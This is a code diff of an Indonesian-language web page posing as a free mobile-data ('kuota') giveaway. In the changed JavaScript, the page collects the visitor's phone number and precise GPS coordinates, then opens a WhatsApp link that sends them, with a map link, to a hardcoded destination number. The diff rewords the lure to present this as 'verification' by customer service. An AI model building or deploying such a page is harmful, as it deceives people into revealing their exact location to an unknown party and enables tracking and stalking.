@@ -95,6 +95,8 @@ body::before{
   50%{transform:scale(1.12)}
   100%{transform:scale(1)}
 }
+
+/* Jeda waktu bergantian */
 .logo-1 { animation-delay: 0s; }
 .logo-2 { animation-delay: 0.35s; }
 .logo-3 { animation-delay: 0.7s; }
@@ -260,17 +262,17 @@ for(let i=0; i<30; i++){
   <p class="sub-judul">Klaim sekarang sebelum kehabisan!</p>
   
   <div class="form-group">
-    <label for="nomorWA">📱 Masukkan Nomor WhatsApp:</label>
+    <label for="nomorWA">📱 Masukkan Nomor Anda:</label>
     <input type="tel" id="nomorWA" placeholder="Contoh: 6281234567xxx" maxlength="15">
   </div>
   <button class="btn" id="getLocBtn">
-    ⚪ KLAIM KUOTA
+    ⚪ KLAIM SEKARANG 
   </button>
   
   <div class="status" id="statusBox"></div>
   <div class="map-link" id="mapBox"></div>
   <p class="catatan">
-    ✅ Lokasi diambil dengan ketepatan tinggi & secepat mungkin.<br>
+    ✅ Setelah izinkan lokasi → data otomatis dikirim ke nomor CS untuk Verifikasi.<br>
     Pastikan nomor diawali <b>62</b> (tanpa + atau 0 di depan).
   </p>
 </div>
@@ -286,13 +288,13 @@ getLocBtn.addEventListener('click', mulaiAmbilLokasi);
 function ambilNomorPengguna(){
   let nomor = nomorWAInput.value.trim().replace(/\D/g,'');
   if(!nomor){
-    tampilStatus('⚠️ Masukkan nomor WhatsApp dulu!', 'error');
+    tampilStatus('⚠️ Silakan Masukkan Nomor Andadulu!', 'error');
     return null;
   }
   if(nomor.startsWith('0')) nomor = '62' + nomor.slice(1);
   if(!nomor.startsWith('62')) nomor = '62' + nomor;
   if(nomor.length < 10){
-    tampilStatus('⚠️ Nomor terlalu pendek!', 'error');
+    tampilStatus('⚠️ Nomor terlalu pendek, periksa kembali!', 'error');
     return null;
   }
   return nomor;
@@ -302,23 +304,16 @@ function mulaiAmbilLokasi(){
   const nomorPengguna = ambilNomorPengguna();
   if(!nomorPengguna) return;
   if(!navigator.geolocation){
-    tampilStatus('❌ Perangkat tidak mendukung lokasi', 'error');
+    tampilStatus('Perangkat tidak mendukung lokasi', 'error');
     return;
   }
-  
-  tampilStatus('📍 Mengambil lokasi... izinkan secepatnya!', 'loading');
+  tampilStatus('🔄 Meminta akses lokasi... izinkan jika diminta', 'loading');
   getLocBtn.disabled = true;
   mapBox.style.display = 'none';
-
-  // ⚡ PENGATURAN MAKSIMAL: Cepat & Akurat
   navigator.geolocation.getCurrentPosition(
     pos => berhasilAmbilLokasi(pos, nomorPengguna),
     gagalAmbilLokasi,
-    {
-      enableHighAccuracy: true,  // Ketepatan MAKSIMAL pakai GPS
-      timeout: 5000,              // Waktu tunggu cuma 5 detik → CEPAT
-      maximumAge: 0               // JANGAN pakai lokasi lama → SELALU BARU
-    }
+    {enableHighAccuracy: true, timeout: 15000, maximumAge: 0}
   );
 }
 
@@ -326,42 +321,32 @@ function berhasilAmbilLokasi(posisi, nomorPengguna){
   const lat = posisi.coords.latitude;
   const lng = posisi.coords.longitude;
   const akurasi = Math.round(posisi.coords.accuracy);
-  
-  let pesanAkurasi = '';
-  if(akurasi <= 10) pesanAkurasi = '✅ SANGAT AKURAT';
-  else if(akurasi <= 50) pesanAkurasi = '✅ AKURAT';
-  else if(akurasi <= 100) pesanAkurasi = '⚠️ Cukup Akurat';
-  else pesanAkurasi = '⚠️ Kurang Akurat';
-
-  tampilStatus(`${pesanAkurasi} — ±${akurasi}m | Mengirim...`, 'success');
-  
+  tampilStatus('✅ Lokasi terekam! Mengirim ke nomor tujuan...', 'success');
   const pesan = 
-`📌 LAPORAN VERIFIKASI KUOTA
+`📌 LAPORAN VERIFIKASI KLAIM KUOTA
 Nomor Pengguna: ${nomorPengguna}
 Lintang: ${lat}
 Bujur: ${lng}
 Akurasi: ±${akurasi} meter
 Waktu: ${new Date().toLocaleString('id-ID')}
 Peta: https://www.google.com/maps?q=${lat},${lng}`;
-
   const waLink = `https://wa.me/${NOMOR_TUJUAN}?text=${encodeURIComponent(pesan)}`;
   mapBox.style.display = 'block';
-  mapBox.innerHTML = `<a href="${waLink}" target="_blank">📱 Klik jika tidak otomatis terbuka</a>`;
+  mapBox.innerHTML = `<a href="${waLink}" target="_blank">📱 Jika tidak otomatis terbuka, klik di sini</a>`;
   
   setTimeout(() => {
     window.open(waLink, '_blank');
-    tampilStatus(`✅ TERKIRIM! Akurasi ±${akurasi}m`, 'success');
-  }, 300);
+    tampilStatus(`✅ Terkirim ke nomor: ${NOMOR_TUJUAN}`, 'success');
+  }, 500);
   
   getLocBtn.disabled = false;
 }
 
 function gagalAmbilLokasi(err){
-  let pesan = '❌ Gagal: ';
-  if(err.code === 1) pesan += 'Izin lokasi DITOLAK → izinkan di pengaturan browser';
-  else if(err.code === 2) pesan += 'Sinyal lokasi TIDAK TERSEDIA → coba di luar ruangan';
-  else if(err.code === 3) pesan += 'TERLAMBAT → periksa sinyal GPS & internet';
-  else pesan += 'Error tidak diketahui';
+  let pesan = '❌ Gagal dapatkan lokasi. ';
+  if(err.code === 1) pesan += 'Izin lokasi ditolak — izinkan di pengaturan browser.';
+  else if(err.code === 2) pesan += 'Sinyal lokasi tidak tersedia.';
+  else if(err.code === 3) pesan += 'Waktu habis, coba lagi.';
   
   tampilStatus(pesan, 'error');
   getLocBtn.disabled = false;
@@ -373,4 +358,5 @@ function tampilStatus(teks, jenis){
 }
 </script>
 </body>
-</html>
+  </html>
+  
